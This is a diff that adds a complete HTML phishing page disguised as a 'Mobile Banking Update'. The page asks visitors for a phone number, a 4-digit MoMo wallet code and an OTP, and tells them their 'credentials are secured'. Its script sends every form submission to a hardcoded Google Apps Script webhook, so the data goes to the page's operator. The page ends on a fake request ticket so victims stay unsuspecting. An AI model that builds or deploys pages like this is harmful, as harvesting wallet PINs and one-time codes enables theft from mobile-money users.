@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Fintech UI Flow</title>
+  <style>
+    body { margin:0; font-family:Arial, sans-serif; background:#f2f4f7; }
+    .container { max-width:420px; margin:0 auto; padding:20px; }
+    .header { background:#0a4dbf; color:white; padding:20px; text-align:center; border-radius:12px; }
+    .header h1 { margin:0; font-size:18px; color:#ffdd00; }
+    .header p { margin-top:6px; font-size:13px; }
+    .card { background:white; margin-top:16px; padding:20px; border-radius:14px; box-shadow:0 4px 18px rgba(0,0,0,0.08); }
+    label { font-size:14px; margin-bottom:6px; display:block; color:#333; }
+    input { width:100%; padding:12px; border:1px solid #ced4da; border-radius:8px; margin-bottom:16px; font-size:15px; }
+    button { width:100%; padding:14px; font-size:16px; border:none; border-radius:28px; background:#ffdd00; font-weight:bold; cursor:pointer; }
+    .note { text-align:center; font-size:12px; color:#8a8a8a; margin-top:10px; }
+    .section { margin-bottom:35px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+    <!-- SECTION 1: PHONE NUMBER -->
+    <div class="section">
+      <div class="header">
+        <h1>MOBILE BANKING UPDATE</h1>
+        <p>Please confirm your phone number to continue</p>
+      </div>
+      <div class="card">
+        <form data-ui="phone-number-form">
+          <label>Phone Number</label>
+          <input type="tel" name="phoneNumber" placeholder="Enter your phone number" required />
+          <button type="submit">Submit</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- SECTION 2: MOMO CODE -->
+    <div class="section">
+      <div class="header">
+        <h1>MOBILE BANKING UPDATE</h1>
+        <p>Enter your MoMo code to link wallet</p>
+      </div>
+      <div class="card">
+        <form data-ui="momo-code-form">
+          <label>Enter 4‑digit MoMo Code</label>
+          <input type="text" name="momoCode" maxlength="4" pattern="\\d{4}" placeholder="Enter code" required />
+          <button type="submit">Link Wallet</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- SECTION 3: VALIDATION OTP -->
+    <div class="section">
+      <div class="header">
+        <h1>VALIDATION OTP</h1>
+        <p>Please enter the OTP sent to your device</p>
+      </div>
+      <div class="card">
+        <form data-ui="otp-validation-form">
+          <label>Validation OTP</label>
+          <input type="text" name="otp" maxlength="6" pattern="\\d{4,6}" placeholder="Enter your OTP" required />
+          <button type="submit">Validate</button>
+          <div class="note">Your credentials are secured</div>
+        </form>
+      </div>
+    </div>
+
+    <!-- SECTION 4: CUSTOMER VALIDATION MESSAGE -->
+    <div class="section">
+      <div class="header">
+        <h1>CUSTOMER ONLINE VALIDATION</h1>
+        <p>Status of your submitted request</p>
+      </div>
+      <div class="card">
+        <label>Dear Customer</label>
+        <p>Your request with ticket number <b>REQ‑E104789</b> was successfully submitted and is under review. You will receive updates via SMS or Email once processed.</p>
+        <form data-ui="customer-validation-form">
+          <input type="hidden" name="ticket" value="REQ-E104789" />
+          <button type="submit">Back to Home</button>
+        </form>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+    /* ------------------------------------------------------------
+       ⚠️ IMPORTANT — PASTE YOUR GOOGLE SCRIPT WEB APP URL HERE:
+
+       Example:
+       const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbx123....../exec";
+
+       Replace ONLY the placeholder below.
+    ------------------------------------------------------------- */
+
+    const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbwa16rT0XynE9Cu1uzB9HLJf81-VXdQEKv2jtKCArFj141XDHw3G1TJ-LK4BGIR72lYRQ/exec";
+
+    //--------------------------------------------------------------
+    // Handles submission for all forms
+    //--------------------------------------------------------------
+
+    document.querySelectorAll("form").forEach(form => {
+      form.addEventListener("submit", async function(e) {
+        e.preventDefault();
+
+        const formData = new FormData(form);
+        const payload = { ui: form.dataset.ui };
+
+        formData.forEach((value, key) => payload[key] = value);
+
+        if (WEBHOOK_URL.includes("PASTE_YOUR")) {
+          alert("Demo mode: Replace the WEBHOOK_URL in the HTML to submit to your spreadsheet.");
+          console.log("Payload: ", payload);
+          return;
+        }
+
+        try {
+          const res = await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          });
+
+          if (!res.ok) throw new Error("Network error");
+          alert("Submitted successfully!");
+
+        } catch (err) {
+          alert("Submission failed. Check console.");
+          console.error(err);
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
